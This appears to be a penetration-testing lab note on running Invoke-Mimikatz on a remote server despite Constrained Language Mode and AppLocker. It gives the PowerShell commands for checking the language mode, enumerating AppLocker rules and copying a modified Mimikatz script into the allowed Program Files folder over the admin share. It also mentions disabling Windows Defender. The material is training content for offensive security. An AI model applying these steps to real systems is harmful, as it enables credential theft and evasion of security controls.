# Constrained Language Mode (CLM) How To overcome

## Encountering error when running scripts
You may notice that it is not possible to execute `Invoke-Mimikatz` due to some errors such as the following results

```powershell
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

## Checking for Contrained Language Mode
This is possibly due to the `Constrained Language Mode`. We can check this by running

```powershell
$ExecutionContext.SessionState.LanguageMode ConstrainedLanguage

# + $ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
# +                                             ~~~~~~~~~~~~~~~~~~~
# Unexpected token 'ConstrainedLanguage' in expression or statement.
```

## Checking Applocker policy (where can i run scripts?)
The reason is because Applocker is configured and we will be dropped into Constrained Language Mode (CLM) when we connect using PowerShell Remoting. To enumerate the Applocker policy, run

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

#PathConditions      : {%PROGRAMFILES%\*}
#PathExceptions      : {}
#PublisherExceptions : {}
#HashExceptions      : {}
#Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
#Name                : (Default Rule) All scripts located in the #Program Files folder
#Description         : Allows members of the Everyone group to run #scripts that are located in the Program Files folder.
#UserOrGroupSid      : S-1-1-0
#Action              : Allow
```

We can see that Everyone can run scripts from the `Program Files` directory as seen above, that means we can can drop scripts into the Program files directory there and execute them. But first, we need to disable windows defender on this server.

## Copy and running to where it's allowed 
Since we cannot run scripts using "dot sourcing" e.g. `. .\Invoke-Mimikatz.ps1` because of the Constrained Language Mode, we can modify the script to include the function call in the script itself. Such as:

- Create a copy of Invoke-Mimikatz.ps1 and rename it to Invoke-MimikatzEx.ps1.
- Open Invoke-MimikatzEx.ps1 in PowerShell ISE (Right click on it and click Edit).
- Add "Invoke-Mimikatz" (without quotes) to the end of the file.

Now, copy the scripts to the location where scripts can be executed
```powershell
Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Now, we can navigate to the location and run the modified script without using dot sourcing

```
cd C:\Program Files
.\Invoke-MimikatzEx.ps1
```